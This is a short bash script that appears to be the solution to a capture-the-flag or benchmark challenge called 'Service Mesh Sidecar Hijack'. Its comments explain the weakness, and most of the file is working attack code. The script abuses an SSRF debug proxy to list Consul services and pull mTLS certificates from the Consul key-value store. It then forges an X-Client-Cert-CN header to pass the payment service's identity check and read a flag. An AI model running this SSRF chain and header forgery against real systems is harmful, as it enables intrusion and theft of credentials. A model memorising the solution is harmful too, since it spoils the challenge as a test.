#!/usr/bin/env bash
# APEX-047-25 — "Service Mesh Sidecar Hijack" (tags: service_mesh, ssrf, mtls)
#
# The gateway publishes `/debug/proxy?url=`, which fetches anything, and the
# mesh behind it is built on the assumption that everything inside is trusted.
# So the proxy is a seat on the internal network: the Consul catalogue lists the
# services, the Consul KV store hands out the mTLS certificates, and the Envoy
# admin port describes the whole cluster.
#
# The last step is the one worth pausing on. The payment service checks
# `X-Client-Cert-CN` — a header — to decide who the caller is. mTLS is a
# handshake, and a header that repeats its outcome is a claim anybody can make;
# the certificate theft two steps earlier turns out not to be needed at all.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
. "$(dirname "$0")/lib.sh"
SESSION="apex047-$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

through() { send "$SESSION" req_0 --create --set path=/debug/proxy --set "query.url=$1" "${@:2}"; }

"$H5I" browser open "$URL/" --session "$SESSION" --new --capture >/dev/null

# What the mesh thinks it is running, and the keys it keeps for it.
through 'http://consul-sim:8500/v1/catalog/services' >/dev/null
through 'http://consul-sim:8500/v1/kv/envoy/certs/payment-service?raw' >/dev/null

# And the identity check that is only a header.
through 'http://payment-service:3003/internal/treasury/flag' \
    --set header.X-Client-Cert-CN=payment-service | flag
